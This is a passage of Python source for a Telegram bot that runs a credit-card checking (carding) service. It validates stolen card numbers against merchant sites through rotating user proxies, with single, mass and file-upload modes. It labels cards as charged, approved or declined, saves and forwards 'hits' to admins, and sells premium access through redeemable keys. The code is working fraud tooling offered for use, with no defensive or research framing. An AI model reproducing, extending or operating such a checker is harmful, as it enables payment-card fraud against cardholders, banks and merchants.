        parts = event.raw_text.split()

        if len(parts) != 3: return await event.reply("Format: /key {amount} {days}")

        amount = int(parts[1])

        days = int(parts[2])

        if amount > 10: return await event.reply("❌ Maximum 10 keys at once!")

        keys_data = await load_json(KEYS_FILE)

        generated_keys = []

        for _ in range(amount):

            key = generate_key()

            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}

            generated_keys.append(key)

        await save_json(KEYS_FILE, keys_data)

        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])

        await event.reply(f"✅ Generated {amount} key(s) for {days} day(s):\n\n{keys_text}")

    except ValueError: await event.reply("❌ Invalid amount or days!")

    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/redeem'))

async def redeem_key(event):

    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())

    try:

        parts = event.raw_text.split()

        if len(parts) != 2: return await event.reply("Format: /redeem {key}")

        key = parts[1].upper()

        keys_data = await load_json(KEYS_FILE)

        if key not in keys_data: return await event.reply("❌ Invalid key!")

        if keys_data[key]['used']: return await event.reply("❌ This key has already been used!")

        if await is_premium_user(event.sender_id): return await event.reply("❌ You already have premium access!")

        days = keys_data[key]['days']

        await add_premium_user(event.sender_id, days)

        keys_data[key]['used'] = True

        keys_data[key]['used_by'] = event.sender_id

        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()

        await save_json(KEYS_FILE, keys_data)

        await event.reply(f"🎉 Congratulations!\n\nYou have successfully redeemed {days} days of premium access!\n\nYou can now use the bot in private chat with 500 CC limit!")

    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/add'))

async def add_site(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    try:

        add_text = event.raw_text[4:].strip()

        if not add_text: return await event.reply("Formet: /add site.com site.com")

        sites_to_add = extract_urls_from_text(add_text)

        if not sites_to_add: return await event.reply("❌ No valid urls/domains found!")

        sites = await load_json(SITE_FILE)

        user_sites = await get_user_sites(event.sender_id)

        added_sites = []

        already_exists = []

        for site in sites_to_add:

            if site in user_sites: already_exists.append(site)

            else:

                user_sites.append(site)

                added_sites.append(site)

        sites[str(event.sender_id)] = user_sites

        await save_json(SITE_FILE, sites)

        response_parts = []

        if added_sites: response_parts.append("\n".join(f"✅ Site Successfully Added: {s}" for s in added_sites))

        if already_exists: response_parts.append("\n".join(f"⚠️ Already Exists: {s}" for s in already_exists))

        if response_parts: await event.reply("\n\n".join(response_parts))

        else: await event.reply("❌ No new sites to add!")

    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/rm'))

async def remove_site(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    try:

        rm_text = event.raw_text[3:].strip()

        if not rm_text: return await event.reply("Format: /rm site.com")

        sites_to_remove = extract_urls_from_text(rm_text)

        if not sites_to_remove: return await event.reply("❌ No valid urls/domains found!")

        sites = await load_json(SITE_FILE)

        user_sites = await get_user_sites(event.sender_id)

        removed_sites = []

        not_found_sites = []

        for site in sites_to_remove:

            if site in user_sites:

                user_sites.remove(site)

                removed_sites.append(site)

            else: not_found_sites.append(site)

        sites[str(event.sender_id)] = user_sites

        await save_json(SITE_FILE, sites)

        response_parts = []

        if removed_sites: response_parts.append("\n".join(f"✅ Removed: {s}" for s in removed_sites))

        if not_found_sites: response_parts.append("\n".join(f"❌ Not Found: {s}" for s in not_found_sites))

        if response_parts: await event.reply("\n\n".join(response_parts))

        else: await event.reply("❌ No sites were removed!")

    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.](addproxy|addpxy)'))

async def add_proxy(event):

    # This command works in private only

    if event.is_group:

        return await event.reply("🔒 This command only works in private chat tο prοtect your prοxy!")

    

    if await is_banned_user(event.sender_id):

        return await event.reply(banned_user_message())

    

    try:

        replied_msg = None

        if event.reply_to_msg_id:

            replied_msg = await event.get_reply_message()

            

        if replied_msg and replied_msg.document:

            file_path = await replied_msg.download_media()

            try:

                async with aiofiles.open(file_path, "r", errors='ignore') as f:

                    lines = (await f.read()).splitlines()

                os.remove(file_path)

            except Exception as e:

                try: os.remove(file_path)

                except: pass

                return await event.reply(f"❌ Error reading file: {e}")

            

            raw_proxies = []

            for line in lines:

                line_str = line.strip()

                if line_str:

                    p_data = parse_proxy_format(line_str)

                    if p_data:

                        raw_proxies.append(p_data)

            if not raw_proxies:

                return await event.reply("❌ **No valid proxies found in the file!**")

                

            proxies = await load_json(PROXY_FILE)

            user_proxies = proxies.get(str(event.sender_id), [])

            current_count = len(user_proxies)

            if current_count >= 100:

                return await event.reply("❌ Proxy Limit Reached!\n\nYou can only add up to 100 proxies.\nUse /rmpxy to remove old ones.")

                

            available_slots = 100 - current_count

            testing_msg = await event.reply(f"🔄 **Testing {len(raw_proxies)} proxies from file (slots available: {available_slots})...**")

            

            added_count = 0

            failed_count = 0

            tested_count = 0

            failed_proxies_list = []

            batch_size = 50

            

            for i in range(0, len(raw_proxies), batch_size):

                if added_count >= available_slots:

                    break

                batch = raw_proxies[i:i+batch_size]

                tasks = []

                for proxy_data in batch:

                    exists = False

                    for existing in user_proxies:

                        if existing['proxy_url'] == proxy_data['proxy_url']:

                            exists = True

                            break

                    if exists:

                        continue

                    tasks.append(test_proxy_helper(proxy_data))

                if not tasks:

                    continue

                results = await asyncio.gather(*tasks, return_exceptions=True)

                for res in results:

                    tested_count += 1

                    if isinstance(res, Exception) or not res or not res[0]:

                        failed_count += 1

                        if not isinstance(res, Exception) and res and len(res) > 1 and res[1]:

                            failed_proxies_list.append(res[1]['proxy_url'])

                    else:

                        is_working, proxy_data, ext_ip = res

                        if is_working and added_count < available_slots:

                            user_proxies.append(proxy_data)

                            added_count += 1

                        else:

                            failed_count += 1

                            failed_proxies_list.append(proxy_data['proxy_url'])

                

                if tested_count > 0 and tested_count % 50 == 0:

                    try:

                        await testing_msg.edit(f"🔄 **Testing proxies...**\n\n📊 **Progress:** {tested_count}/{len(raw_proxies)} tested\n➕ **Working:** {added_count}\n❌ **Failed:** {failed_count}")

                    except Exception:

                        pass

            

            if added_count > 0:

                proxies[str(event.sender_id)] = user_proxies

                await save_json(PROXY_FILE, proxies)

            

            failed_list_str = ""

            if failed_proxies_list:

                display_failed = failed_proxies_list[:50]

                failed_list_str = "\n\n❌ **Failed/Invalid Proxies List:**\n" + "\n".join(f"• `{p}`" for p in display_failed)

                if len(failed_proxies_list) > 50:

                    failed_list_str += f"\n...and {len(failed_proxies_list) - 50} more dead proxies."

            

            await testing_msg.edit(f"✅ **Proxy import completed!**\n\n➕ **Added:** {added_count} working proxies\n❌ **Failed/Invalid:** {failed_count}\n📊 **Total Saved Proxies:** {len(user_proxies)}/100{failed_list_str}")

            

        else:

            parts = event.raw_text.split(maxsplit=1)

            if len(parts) != 2:

                return await event.reply("Format: /addproxy ip:port:username:password\n")

            

            proxy_str = parts[1].strip()

            proxy_data = parse_proxy_format(proxy_str)

            

            if not proxy_data:

                return await event.reply("❌ Invalid proxy format!\n\nUse: ip:port:username:password\n")

            

            proxies = await load_json(PROXY_FILE)

            user_proxies = proxies.get(str(event.sender_id), [])

            

            if len(user_proxies) >= 100:

                return await event.reply("❌ Proxy Limit Reached!\n\nYou can only add up to 100 proxies.\nUse /rmpxy to remove old ones.")

            

            for existing_proxy in user_proxies:

                if existing_proxy['proxy_url'] == proxy_data['proxy_url']:

                    return await event.reply("⚠️ This proxy is already added!")

            

            proxy_type_display = proxy_data.get('type', 'http').upper()

            testing_msg = await event.reply(f"🔄 Testing {proxy_type_display} proxy...")

            is_working, result = await test_proxy(proxy_data['proxy_url'])

            

            if not is_working:

                await testing_msg.edit(f"❌ Proxy is not working!\n\nError: {result}")

                return

            

            user_proxies.append(proxy_data)

            proxies[str(event.sender_id)] = user_proxies

            await save_json(PROXY_FILE, proxies)

            

            auth_display = f"👤 {proxy_data['username']}" if proxy_data.get('username') else "🔓 No Auth"

            await testing_msg.edit(f"✅ Proxy added successfully!\n\n🌐 External IP: {result}\n📍 Proxy: {proxy_data['ip']}:{proxy_data['port']}\n🔐 Typе: {proxy_type_display}\n{auth_display}\n📊 Total Proxies: {len(user_proxies)}/100")

            

    except Exception as e:

        await event.reply(f"❌ Errοr: {e}")

@client.on(events.NewMessage(pattern='/rmpxy'))

async def remove_proxy(event):

    # This command works in private only

    if event.is_group:

        return await event.reply("🔒 This command only works in private chat!")

    

    if await is_banned_user(event.sender_id):

        return await event.reply(banned_user_message())

    

    try:

        proxies = await load_json(PROXY_FILE)

        user_proxies = proxies.get(str(event.sender_id), [])

        

        if not user_proxies:

            return await event.reply("❌ You don't have any proxy saved!")

        

        parts = event.raw_text.split(maxsplit=1)

        

        # If no argument, show usage

        if len(parts) == 1:

            return await event.reply("Format: /rmpxy <index>\nOr: /rmpxy all\n\nUse /proxy to see index numbers")

        

        arg = parts[1].strip().lower()

        

        # Remove all proxies

        if arg == 'all':

            del proxies[str(event.sender_id)]

            await save_json(PROXY_FILE, proxies)

            return await event.reply(f"✅ All {len(user_proxies)} proxies removed successfully!")

        

        # Remove by index

        try:

            index = int(arg) - 1  # Convert to 0-based index

            

            if index < 0 or index >= len(user_proxies):

                return await event.reply(f"❌ Invalid index!\n\nYou have {len(user_proxies)} proxies (1-{len(user_proxies)})")

            

            removed_proxy = user_proxies.pop(index)

            

            if user_proxies:

                proxies[str(event.sender_id)] = user_proxies

            else:

                del proxies[str(event.sender_id)]

            

            await save_json(PROXY_FILE, proxies)

            

            await event.reply(f"✅ Proxy removed!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 Remaining: {len(user_proxies)}")

            

        except ValueError:

            return await event.reply("❌ Invalid index!\n\nUse: /rmpxy 1 or /rmpxy all")

        

    except Exception as e:

        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/proxy'))

async def view_proxy(event):

    # This command works in private only

    if event.is_group:

        return await event.reply("🔒 This command only works in private chat!")

    

    if await is_banned_user(event.sender_id):

        return await event.reply(banned_user_message())

    

    try:

        user_proxies = await get_all_user_proxies(event.sender_id)

        

        if not user_proxies:

            return await event.reply("❌ You don't have any proxy saved!\n\nUse /addpxy to add one.")

        

        # Build proxy list message

        proxy_list = f"📡 **Your Proxies** ({len(user_proxies)}/100)\n\n"

        

        for idx, proxy_data in enumerate(user_proxies, 1):

            proxy_type = proxy_data.get('type', 'http').upper()

            auth_info = ""

            if proxy_data.get('username'):

                auth_info = f" | 👤 {proxy_data['username']}"

            

            proxy_list += f"`{idx}.` 🔐 {proxy_type} | 📍 {proxy_data['ip']}:{proxy_data['port']}{auth_info}\n"

        

        proxy_list += f"\n**ℹ️ Info:**\n⚡ Bot uses random proxy for each check\n❌ Dead proxies are auto-removed\n🌐 Supports HTTP, HTTPS, SOCKS4, SOCKS5\n➕ Use `/rmpxy <index>` to remove specific proxy\n❌ Use `/rmpxy all` to remove all proxies"

        

        await event.reply(proxy_list)

        

    except Exception as e:

        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))

async def sh(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    if not can_access:

        buttons = [[Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]]

        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)

    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):

    # Get username

    try:

        sender = await event.get_sender()

        username = sender.username if sender.username else f"user_{event.sender_id}"

    except:

        username = f"user_{event.sender_id}"

    

    # Check if user has added proxy

    proxy_data = await get_user_proxy(event.sender_id)

    if not proxy_data:

        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    

    card = None

    if event.reply_to_msg_id:

        replied_msg = await event.get_reply_message()

        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)

        if not card: return await event.reply("Couldn't extract valid card info from replied message\n\nFormet ➜ /sh 4111111111111111|12|2025|123")

    else:

        card = extract_card(event.raw_text)

        if not card: return await event.reply("Format ➜ /sh 4111111111111111|12|2025|123\n\nOr reply to a message containing credit card info", parse_mode="markdown")

    user_sites = await get_user_sites(event.sender_id)

    if not user_sites: return await event.reply("You haven't added any URLs. First add using /add")

    loading_msg = await event.reply("🔄 **Checking Card. Please wait.**")

    start_time = time.time()

    async def animate_loading():

        dots = [".", "..", "...", "..", "."]

        i = 0

        while True:

            try:

                await loading_msg.edit(f"🔄 **Checking Card{dots[i % 5]} Please wait.**")

                await asyncio.sleep(0.5)

                i += 1

            except: break

    loading_task = asyncio.create_task(animate_loading())

    try:

        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)

        loading_task.cancel()

        end_time = time.time()

        elapsed_time = round(end_time - start_time, 2)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

        response_text = res.get("Response", "").lower()

        status_text = res.get("Status", "").lower()

        

        # Check for charged status

        is_charged = False

        if "charged" in response_text or "charged" in status_text:

            status_header = "CHARGED 💎"

            status_result = "Charged"

            is_charged = True

            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))

        elif "cloudflare bypass failed" in response_text:

            status_header = " LOU     E SPOTTED ⚠️"

            res["Response"] = "Cloudflare spotted 🤡 change site or try again"

        elif "thank you" in response_text or "payment successful" in response_text:

            status_header = "CHARGED 💎"

            status_result = "Charged"

            is_charged = True

            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))

        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):

            status_header = "APPROVED ✅"

            status_result = "Approved"

            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))

        else:

            status_header = "~~ DECLINED ~~ ❌"

            status_result = "Declined"

        msg = f"""{status_header}

📂 **CC ⇾** `{card}`
⚡ **Gateway ⇾** {res.get('Gateway', 'Unknown')}
ℹ️ **Response ⇾** {res.get('Response')}
💸 **Price ⇾** {res.get('Price')} 💸
📍 **Site ⇾** {site_index}

```BIN Info: {brand} - {bin_type} - {level}
🏦 Bank: {bank}
📍 Country: {country} {flag}```
⏳ **Took** {elapsed_time} seconds"""

        await loading_msg.delete()

        result_msg = await event.reply(msg)

        if is_charged: 
            await pin_charged_message(event, result_msg)
            for admin_id in ADMIN_ID:
                try: await client.send_message(admin_id, f"💎 **NEW CHARGED CC HIT (Single Check)!** 💎\n\n{msg}")
                except Exception as e: print(f"Failed to send hit to admin {admin_id}: {e}")

    except Exception as e:

        loading_task.cancel()

        await loading_msg.delete()

        await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))

async def msh(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    if not can_access:

        buttons = [[Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]]

        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)

    

    # Check if user has added proxy

    proxy_data = await get_user_proxy(event.sender_id)

    if not proxy_data:

        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    

    cards = []

    if event.reply_to_msg_id:

        replied_msg = await event.get_reply_message()

        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)

        if not cards: return await event.reply("Couldn't extract valid cards from replied message\n\nFormet. /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123")

    else:

        cards = extract_all_cards(event.raw_text)

        if not cards: return await event.reply("Formet. /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards")

    if len(cards) > 20:

        cards = cards[:20]

        await event.reply(f"``` ⚠️ Only checking first 20 cards out of {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} provided. Limit is 20 cards for /msh.```")

    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.reply("**Your CC is already Cooking 🍳 wait for complete**")
    user_sites = await get_user_sites(user_id)
    if not user_sites: return await event.reply("Your Aree not Added Any Url First Add Url")
    
    status_msg = await event.reply(f"**🍳 Found {len(cards)} CCs. All CCs will be checked**")
    ACTIVE_MTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_msh_cards(event, cards, user_sites, status_msg))

async def process_msh_cards(event, cards, sites, status_msg):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    
    local_sites = sites.copy()
    cards_per_site = 2
    current_site_index = 0
    cards_on_current_site = 0
    batch_size = 10
    
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=100)) as session:
            for i in range(0, len(cards), batch_size):
                if user_id not in ACTIVE_MTXT_PROCESSES:
                    break
                if not local_sites:
                    final_caption = f"""⛔ **All sites are dead!**

Please add fresh sites using `/add` and try again.

Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Checked ☠️ : {checked}/{total}"""
                    final_buttons = [[Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)], [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)], [Button.inline(f"Dead Sites! ➜ [{checked}/{total}]", b"none", style="danger", icon=5172739056592749710)]]
                    try: await status_msg.edit(final_caption, buttons=final_buttons)
                    except: pass
                    ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                    return

                batch = cards[i:i+batch_size]
                tasks = []
                task_cards = []
                for card in batch:
                    if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                        break
                    current_site = local_sites[current_site_index]
                    tasks.append(check_card_specific_site(card, current_site, user_id, session=session))
                    task_cards.append((card, current_site))
                    
                    cards_on_current_site += 1
                    if cards_on_current_site >= cards_per_site:
                        current_site_index = (current_site_index + 1) % len(local_sites)
                        cards_on_current_site = 0

                if not tasks: continue
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                    if user_id not in ACTIVE_MTXT_PROCESSES: break
                    if isinstance(result, Exception):
                        result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
                    
                    checked += 1
                    start_time = time.time()
                    end_time = time.time()
                    elapsed_time = round(end_time - start_time, 2)
                    response_text = result.get("Response", "")
                    response_text_lower = response_text.lower()

                    if is_site_dead(response_text):
                        declined += 1
                        if site_used in local_sites:
                            local_sites.remove(site_used)
                            current_site_index = 0
                            cards_on_current_site = 0
                        continue

                    if "3d" in response_text_lower:
                        declined += 1
                        continue

                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    should_send_message = False
                    status_text_lower = result.get("Status", "").lower()

                    if "charged" in response_text_lower or "charged" in status_text_lower:
                        charged += 1
                        status_header = "CHARGED 💎"
                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                        should_send_message = True
                    elif "cloudflare bypass failed" in response_text_lower:
                        status_header = "CLOUDFLARE SPOTTED ⚠️"
                        result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        charged += 1
                        status_header = "CHARGED 💎"
                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                        should_send_message = True
                    elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                        approved += 1
                        status_header = "APPROVED ✅"
                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                        should_send_message = True
                    else:
                        declined += 1

                    if should_send_message:
                        card_msg = f"""{status_header}

📂 **CC ⇾** `{card}`
⚡ **Gateway ⇾** {result.get('Gateway', 'Unknown')}
ℹ️ **Response ⇾** {result.get('Response')}
💸 **Price ⇾** {result.get('Price')} 💸
📍 **Site ⇾** {sites.index(site_used) + 1 if site_used in sites else "?"}

```BIN Info: {brand} - {bin_type} - {level}
🏦 Bank: {bank}
📍 Country: {country} {flag}```
⏳ **Took** {elapsed_time} seconds"""
                        result_msg = await event.reply(card_msg)
                        if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                            await pin_charged_message(event, result_msg)
                            for admin_id in ADMIN_ID:
                                try: await client.send_message(admin_id, f"💎 **NEW CHARGED CC HIT (Mass Check)!** 💎\n\n{card_msg}")
                                except Exception as e: print(f"Failed to send hit to admin {admin_id}: {e}")

                    buttons = [
                        [Button.inline(f"Card ➜ {card[:12]}****", b"none")],
                        [Button.inline(f"Response ➜ {result.get('Response')[:25]}...", b"none")],
                        [
                            Button.inline(f"CHARGE: {charged} 💎", b"none", style="success", icon=4902715076873553054),
                            Button.inline(f"Approve: {approved} ✅", b"none", style="primary", icon=5084974483685507801),
                            Button.inline(f"Decline: {declined} ❌", b"none", style="danger")
                        ],
                        [
                            Button.inline(f"Progress: {checked}/{total}", b"none", style="primary", icon=5980995951160987855),
                            Button.inline("Stop 🚫", f"stop_mtxt:{user_id}".encode(), style="danger", icon=5172739056592749710)
                        ]
                    ]
                    try: await status_msg.edit("**Cooking 🍳 CCs One by One...**", buttons=buttons)
                    except: pass
                    await asyncio.sleep(0.1)

            final_caption = f"""**✅ Checking Complete!**

Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Checked ☠️ : {total}"""
            final_buttons = [
                [
                    Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none", style="success", icon=4902715076873553054),
                    Button.inline(f"Approve ➜ [ {approved} ] ✅", b"none", style="primary", icon=5084974483685507801)
                ],
                [
                    Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none", style="danger"),
                    Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")
                ]
            ]
            try: await status_msg.edit(final_caption, buttons=final_buttons)
            except: pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))

async def mtxt(event):

    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned": return await event.reply(banned_user_message())

    if not can_access:

        buttons = [[Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]]

        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)

    

    # Check if user has added proxy

    proxy_data = await get_user_proxy(event.sender_id)

    if not proxy_data:

        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    

    user_id = event.sender_id

    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("**Your CC is already Cooking 🍳 wait for complete**")

    try:

        if not event.reply_to_msg_id: return await event.reply("```Please reply to a document message with /mtxt```")

        replied_msg = await event.get_reply_message()

        if not replied_msg or not replied_msg.document: return await event.reply("```Please reply to a document message with /mtxt```")

        file_path = await replied_msg.download_media()

        try:

            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()

            os.remove(file_path)

        except Exception as e:

            try: os.remove(file_path)

            except: pass

            return await event.reply(f"❌ Error reading file: {e}")

        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]

        if not cards: return await event.reply("Any Valid CC not Found 🥲")

        cc_limit = get_cc_limit(access_type, user_id)

        total_cards_found = len(cards)

        if len(cards) > cc_limit:

            cards = cards[:cc_limit]

            status_msg = await event.reply(f"""**🍳 Found {total_cards_found} CCs in file

⚠️ Processing only first {cc_limit} CCs (your limit)

👑 {len(cards)} CCs will be checked**""")

        else:
            status_msg = await event.reply(f"""**🍳 Found {total_cards_found} valid CCs in file

👑 All {len(cards)} CCs will be checked**""")

        user_sites = await get_user_sites(event.sender_id)

        if not user_sites: return await event.reply("Site Not Found In Your Db")

        ACTIVE_MTXT_PROCESSES[user_id] = True

        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy(), status_msg))

    except Exception as e:

        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

        await event.reply(f"❌ Error: {e}")

async def process_mtxt_cards(event, cards, local_sites, status_msg):

    # Get username

    try:

        sender = await event.get_sender()

        username = sender.username if sender.username else f"user_{event.sender_id}"

    except:

        username = f"user_{event.sender_id}"

    

    user_id = event.sender_id

    total = len(cards)

    checked, approved, charged, declined = 0, 0, 0, 0

    # Reusing passed status_msg

    cards_per_site = 4

    current_site_index = 0

    cards_on_current_site = 0

    try:
        batch_size = 25
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=100)) as session:
            for i in range(0, len(cards), batch_size):

                if not local_sites:

                    await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")

                    break

                batch = cards[i:i+batch_size]

                tasks = []

                task_cards = []

                if user_id not in ACTIVE_MTXT_PROCESSES:

                    final_caption = f"""**⛔ Checking Stopped!

    Total CHARGE 💎 : {charged}

    Total Approve 🔥 : {approved}

    Total Decline ❌ : {declined}

    Total Checked ☠️ : {checked}/{total}**

    """

                    final_buttons = [[Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)], [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)], [Button.inline(f"Stop ➜ [{checked}/{total}] ⛔", b"none")]]

                    try: await status_msg.edit(final_caption, buttons=final_buttons)

                    except: pass

                    return

                for card in batch:

                    if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:

                        break

                    current_site = local_sites[current_site_index]

                    tasks.append(check_card_specific_site(card, current_site, user_id, session=session))

                    # Store the actual site URL instead of index to avoid index errors

                    task_cards.append((card, current_site))

                    cards_on_current_site += 1

                    if cards_on_current_site >= cards_per_site:

                        current_site_index = (current_site_index + 1) % len(local_sites)

                        cards_on_current_site = 0

            

                if not tasks: continue

                results = await asyncio.gather(*tasks, return_exceptions=True)

                for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):

                    if user_id not in ACTIVE_MTXT_PROCESSES: break

                    if isinstance(result, Exception):

                        result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                    checked += 1

                    start_time = time.time()

                    end_time = time.time()

                    elapsed_time = round(end_time - start_time, 2)

                

                    response_text = result.get("Response", "")

                    response_text_lower = response_text.lower()

                    if is_site_dead(response_text):

                        declined += 1

                        if site_used in local_sites:

                            local_sites.remove(site_used)

                            all_sites_data = await load_json(SITE_FILE)
                            user_sites_list = await get_user_sites(user_id)
                            if site_used in user_sites_list:
                                user_sites_list.remove(site_used)
                                all_sites_data[str(user_id)] = user_sites_list
                                await save_json(SITE_FILE, all_sites_data)

                            current_site_index = 0

                            cards_on_current_site = 0

                    

                        # Check if all sites are now dead

                        if not local_sites:

                            final_caption = f"""**⛔ All sites are dead!

    Please add fresh sites using `/add` and try again.

    Total CHARGE 💎 : {charged}

    Total Approve 🔥 : {approved}

    Total Decline ❌ : {declined}

    Total Checked ☠️ : {checked}/{total}**

    """

                            final_buttons = [[Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)], [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)], [Button.inline(f"Dead Sites! ➜ [{checked}/{total}]", b"none", style="danger", icon=5172739056592749710)]]

                            try: await status_msg.edit(final_caption, buttons=final_buttons)

                            except: pass

                            ACTIVE_MTXT_PROCESSES.pop(user_id, None)

                            return

                        continue

                    if "3d" in response_text_lower:

                        declined += 1

                        continue

                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

                    should_send_message = False

                    status_text_lower = result.get("Status", "").lower()

                

                    # Check for charged status

                    if "charged" in response_text_lower or "charged" in status_text_lower:

                        charged += 1

                        status_header = "CHARGED 💎"

                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    elif "cloudflare bypass failed" in response_text_lower:

                        status_header = "CLOUDFLARE SPOTTED ⚠️"

                        result["Response"] = "Cloudflare spotted 🤡 change site or try again"

                        checked -= 1

                    elif "thank you" in response_text_lower or "payment successful" in response_text_lower:

                        charged += 1

                        status_header = "CHARGED 💎"

                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):

                        approved += 1

                        status_header = "APPROVED ✅"

                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))

                        should_send_message = True

                    else:

                        declined += 1

                        status_header = "~~ DECLINED ~~ ❌"

                    # Get site index for display (find current position in list)

                    try:

                        display_site_index = local_sites.index(site_used) + 1 if site_used in local_sites else "?"

                    except:
